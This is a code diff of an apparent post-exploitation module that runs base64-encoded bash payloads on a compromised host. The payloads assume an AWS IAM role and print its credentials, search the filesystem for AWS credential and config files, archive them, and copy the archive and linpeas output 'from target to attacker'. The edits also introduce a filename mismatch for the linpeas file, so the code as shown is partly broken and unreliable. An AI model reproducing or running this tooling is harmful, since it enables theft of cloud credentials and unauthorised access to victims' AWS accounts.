@@ -51,8 +51,9 @@ class Module(BaseModule):
                 ROLE_NAME="rds_user_access_role_ciemdemo"
                 SESSION_NAME="khon.traktour@interlacelabs"
                 AWS_ACCOUNT_NUMBER=$(aws sts get-caller-identity --profile=$PROFILE $opts | jq -r '.Account')
-                log "Account Number: $AWS_ACCOUNT_NUMBER"
+                echo "Account Number: $AWS_ACCOUNT_NUMBER"
                 CREDS=$(aws sts assume-role --role-arn "arn:aws:iam::$AWS_ACCOUNT_NUMBER:role/$ROLE_NAME" --role-session-name="$SESSION_NAME")
+                echo "Assume Role Creds: $CREDS"
                 ''')
                 session.log("payload loaded and ready")
                 result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_assumerole | base64 -d | /bin/bash'")
@@ -61,6 +62,12 @@ class Module(BaseModule):
                 # remove any pre-existing cred archived
                 if session.platform.Path('/tmp/aws_creds.tgz').exists():
                     session.platform.unlink('/tmp/aws_creds.tgz')
+
+                # create an archive of all aws creds
+                payload = base64.b64encode(b"find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n'")
+                session.log("running credentials find...")
+                result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscredsfind | base64 -d | /bin/bash'")
+                session.log(result)
 
                 # create an archive of all aws creds
                 payload = base64.b64encode(b"tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name 'credentials' -a -path '*.aws/credentials' \) -o \( -name 'config' -a -path '*.aws/config' \) \)  -printf '%P\n')")
@@ -73,14 +80,14 @@ class Module(BaseModule):
                     os.unlink(f'/tmp/{hostname}_aws_creds.tgz')
                 
                 # transfer files from target to attacker
-                session.log("copying credentials tgz...")
+                session.log("copying /tmp/aws_creds.tgz...")
                 with session.platform.open('/tmp/aws_creds.tgz', 'rb') as f1:
                     with open(f'/tmp/{hostname}_aws_creds.tgz','wb') as f2:
                         f2.write(f1.read())
                 
-                session.log("copying linpeas.txt...")
-                with session.platform.open('/tmp/linepeas.txt', 'rb') as f1:
-                    with open(f'/tmp/{hostname}_linepeas.txt','wb') as f2:
+                session.log("copying /tmp/linpeas.txt...")
+                with session.platform.open('/tmp/linpeas.txt', 'rb') as f1:
+                    with open(f'/tmp/{hostname}linpeas.txt','wb') as f2:
                         f2.write(f1.read())
 
                 # remove temporary archive from target
@@ -109,7 +116,7 @@ class Module(BaseModule):
                 shutil.copy2(iam2rds, iam2rds_path)
 
                 # copy linpeas.txt into our working directory
-                linpeas = Path(f'/tmp/{hostname}_linepeas.txt')
+                linpeas = Path(f'/tmp/{hostname}_linpeas.txt')
                 shutil.copy2(linpeas, iam2rds_path)
                 
                 # execute script
